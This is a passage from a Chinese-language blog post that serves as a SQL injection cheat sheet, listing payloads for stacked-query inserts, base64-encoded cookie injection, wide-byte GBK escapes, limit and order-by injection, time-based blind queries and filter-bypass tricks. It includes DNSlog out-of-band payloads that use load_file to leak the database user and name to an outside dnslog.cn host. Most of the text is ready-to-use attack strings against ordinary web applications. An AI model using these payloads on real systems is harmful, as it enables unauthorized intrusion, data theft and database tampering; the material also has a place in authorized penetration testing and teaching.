<span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">;</span> insert into <span class="token function">users</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token function">values</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token char">'aaa'</span><span class="token punctuation">,</span><span class="token char">'bbb'</span><span class="token punctuation">)</span>#

</code></pre> 
<p><img src="https://images2.imgbox.com/19/0a/Nu1GjAsH_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_298"></a>二次注入</h4> 
<p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。<br> <img src="https://images2.imgbox.com/92/11/u0yKoioI_o.png" alt="image"></p> 
<p>博客链接：<a href="https://zhuanlan.zhihu.com/p/39917830" rel="nofollow">https://zhuanlan.zhihu.com/p/39917830</a></p> 
<h4><a id="_305"></a>加密解密注入</h4> 
<pre><code class="prism language-c">Cookie<span class="token operator">:</span> uname<span class="token operator">=</span>YWRtaW4<span class="token operator">%</span><span class="token number">3</span>D
</code></pre> 
<p><code>YWRtaW4%3D</code>这是一个base64加密的字符串其中%3D是编码中的=符号，把他发送到编码模块当中解密,得到明文</p> 
<p>发现这个是注入点需要将原来的注入方式重新加密发送给服务器，可以构造注入语句进行base64加密进行报错注入<br> !](https://img-blog.csdnimg.cn/9e28a967032348718dd4b344cade2694.png)</p> 
<h4><a id="Dnslog_316"></a>Dnslog对外注入</h4> 
<p>通常我们面对SQL注入过程中没有回显的情况下，只能通过盲注的方式来判断是否存在SQL注入，但是，使用盲注，手工测试是需要花费大量的时间的，可能会想到使用sqlmap直接去跑出数据，但在实际测试中，使用sqlmap跑盲注，有很大的几率，网站把ip给封掉，这就影响了我们的测试进度，也许你也可以使用代理池</p> 
<p>注入语句：</p> 
<pre><code class="prism language-c"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token char">' and (select load_file(concat('</span>\\<span class="token char">',(select hex(user())),'</span><span class="token number">.682</span>y4b<span class="token punctuation">.</span>dnslog<span class="token punctuation">.</span>cn<span class="token operator">/</span>abc'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">+</span>

<span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token char">' and (select load_file(concat('</span>\\<span class="token char">',(select database()),'</span><span class="token number">.682</span>y4b<span class="token punctuation">.</span>dnslog<span class="token punctuation">.</span>cn<span class="token operator">/</span>abc'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">+</span>
</code></pre> 
<h4><a id="_327"></a>中转注入</h4> 
<p>比如受害者网站URL注入点是经过编码的，不能直接结合sqlmap进行漏洞利用，所以本地搭建一个网站，写一个php脚本编码文件，就可以结合sqlmap工具进行测试。</p> 
<p>因为，注入点经过复杂编码之后，就不能直接结合sqlmap进行漏洞攻击了。或者sqlmap自己编写tamper脚本进行攻击</p> 
<p>可参考：</p> 
<pre><code class="prism language-c">搜索框注入
注入payload：

<span class="token operator">%</span><span class="token char">' and '</span><span class="token operator">%</span><span class="token number">1</span><span class="token operator">%</span><span class="token char">'='</span><span class="token operator">%</span><span class="token number">1</span>

<span class="token operator">%</span><span class="token char">' and '</span><span class="token operator">%</span><span class="token number">1</span><span class="token operator">%</span><span class="token char">'='</span><span class="token operator">%</span><span class="token number">2</span>
</code></pre> 
<p>Sql数据库语句：<code>select * from sqltest where names like '%要查询的关键字%'</code></p> 
<pre><code class="prism language-c">a<span class="token operator">%</span>’ and <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>– 正常

a<span class="token operator">%</span>’ and <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span>– 错误
</code></pre> 
<p>有搜索数据的框可以试试加个%总能大力出奇迹</p> 
<h4><a id="_353"></a>宽字节注入</h4> 
<p>前提</p> 
<p>1.使用了addslashes()函数</p> 
<p>2.数据库设置了编码模式为GBK</p> 
<p>原理：前端输入%df时，首先经过addslashes()转义变成%df%5c%27，之后，在数据库查询前，因为设置了GBK编码，GBK编码在汉字编码范围内的两个字节都会重新编码成一个汉字。然后mysql服务器会对查询的语句进行GBK编码，%df%5c编码成了“运”，而单引号逃逸了出来，形成了注入漏洞</p> 
<pre><code class="prism language-c"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">%</span>df' and <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">--</span><span class="token operator">+</span>

<span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">%</span>df' and <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token operator">--</span><span class="token operator">+</span>

<span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>df' <span class="token keyword">union</span> select <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<p>Cookie注入和Xff注入<br> 主要是看看程序员有没有在cookie中做了一些过滤，我们有没有可趁之机。</p> 
<pre><code class="prism language-c">Cookie<span class="token operator">:</span> ' order by <span class="token number">4</span><span class="token operator">--</span><span class="token operator">+</span>
</code></pre> 
<h4><a id="XForwardedFor_377"></a>X-Forwarded-For注入</h4> 
<p>代表客户端真实的IP，通过修改X-Forwarded-for的值可以伪造客户端IP</p> 
<p>尝试抓包添加插入X-Forwarded-For:127.0.0.1头进行sql注入</p> 
<h4><a id="Between_383"></a>Between注入</h4> 
<p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p> 
<p>mysql语句：</p> 
<pre><code class="prism language-cpp">select <span class="token operator">*</span> from users where id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token function">substr</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> between <span class="token char">'a'</span> <span class="token operator">and</span> <span class="token char">'b'</span><span class="token punctuation">;</span>

select <span class="token operator">*</span> from users where id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token function">substr</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> between <span class="token char">'a'</span> <span class="token operator">and</span> <span class="token char">'t'</span><span class="token punctuation">;</span>
</code></pre> 
<p>借鉴大佬图片：</p> 
<p><img src="https://images2.imgbox.com/1c/7e/s1PisXUU_o.png" alt="image"></p> 
<h4><a id="limit_400"></a>limit注入</h4> 
<p>mysql语句： select * from limit test limit 1,[可控点] or select … limit [可控点]</p> 
<p>limit后面能够拼接的函数只有into和procedure，into可以用来写文件，本文我们不考虑。在Limit后面 可以用 procedure analyse()这个子查询，而且只能用extractvalue 和 benchmark 函数进行延时</p> 
<pre><code class="prism language-cpp">procedure <span class="token function">analyse</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token function">benchmark</span><span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">,</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>

select id from users<span class="token punctuation">;</span>

select id from users limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">union</span> select username from users<span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/b4/09/B0M2RSs7_o.png" alt="在这里插入图片描述"></p> 
<p>select field from user where id &gt;0 order by id limit 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</p> 
<p>基于时间盲注：</p> 
<pre><code class="prism language-cpp">SELECT field FROM table WHERE id <span class="token operator">&gt;</span> <span class="token number">0</span> ORDER BY id LIMIT <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span> PROCEDURE <span class="token function">analyse</span><span class="token punctuation">(</span><span class="token punctuation">(</span>select <span class="token function">extractvalue</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">IF</span><span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span><span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> LIKE <span class="token number">5</span><span class="token punctuation">,</span> <span class="token function">BENCHMARK</span><span class="token punctuation">(</span><span class="token number">5000000</span><span class="token punctuation">,</span><span class="token function">SHA1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre> 
<p>order by注入<br> select * from 表名 order by 列名(或者数字) asc；升序(默认升序)</p> 
<p>select * from 表名 order by 列名(或者数字) desc；降序</p> 
<p>当页面出现mysql报错信息时，注入点在 order by后面，此时可以利用报错信息进行注入，尝试报错注入</p> 
<p><img src="https://images2.imgbox.com/cb/81/5yK2EVZN_o.png" alt="image"></p> 
<p>?sort=1 and(select extractvalue(0x7e,concat(0x7e,database(),0x7e)))</p> 
<p>?sort=(select 1 from(select 1 and if(ascii(substr((user()),1,1))=114,sleep(5),1))x)</p> 
<h3><a id="Sql_438"></a>Sql注入绕过姿势</h3> 
<h4><a id="_439"></a>绕过空格</h4> 
<p>两个空格代替一个空格，用Tab代替空格，%a0=空格：</p> 
<p>payload:</p> 
<p>%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /!/</p> 
<p>最基本的绕过方法，用注释替换空格： /* 注释 */</p> 
<p><img src="https://images2.imgbox.com/63/94/PV0iR36p_o.png" alt="image"></p> 
<p>括号绕过空格</p> 
<p>mysql语句：select(user())from dual where(1=1)and(2=2)</p> 
<p>这种过滤方法常常用于time based盲注,例如：</p> 
<p>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</p> 
<h4><a id="_459"></a>绕过引号</h4> 
<p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p> 
<pre><code class="prism language-c">select column_name from information_schema<span class="token punctuation">.</span>tables where table_name<span class="token operator">=</span><span class="token number">0x7573657273</span>
</code></pre> 
<p>绕过逗号<br> 在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p> 
<pre><code class="prism language-c">select <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> from <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

select <span class="token function">mid</span><span class="token punctuation">(</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> from <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>使用join：</p> 
<p>union select 1,2#</p> 
<p>等价于 union select * from (select 1)a join (select 2)b</p> 
<p>使用like:</p> 
<p>select ascii(mid(user(),1,1))=80 #</p> 
<p>等价于 select user() like ‘r%’</p> 
<p>对于limit可以使用offset来绕过：</p> 
<p>select * from news limit 0,1 #</p> 
<p>等价于下面这条SQL语句 select * from news limit 1 offset 0</p> 
<h4><a id="_493"></a>绕过比较符号()</h4> 
<p>（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：</p> 
<p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</p> 
<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。 最常见的一个盲注的sql语句：</p> 
<pre><code class="prism language-c">select <span class="token operator">*</span> from users where id<span class="token operator">=</span><span class="token number">1</span> and <span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">64</span>
</code></pre> 
<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 那么上面的这条sql语句可以使用greatest变为如下的子句:</p> 
<pre><code class="prism language-cpp">select <span class="token operator">*</span> from users where id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token function">greatest</span><span class="token punctuation">(</span><span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">64</span>
</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/b74236e75b4b54e85c2d623a97994fe1/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Excel工具类 古天山</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/ae0cc9d5c6480fd2c93a72a6a16677d8/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">redis分布式锁的原理与实现【分布式】</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程鬼谷子的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>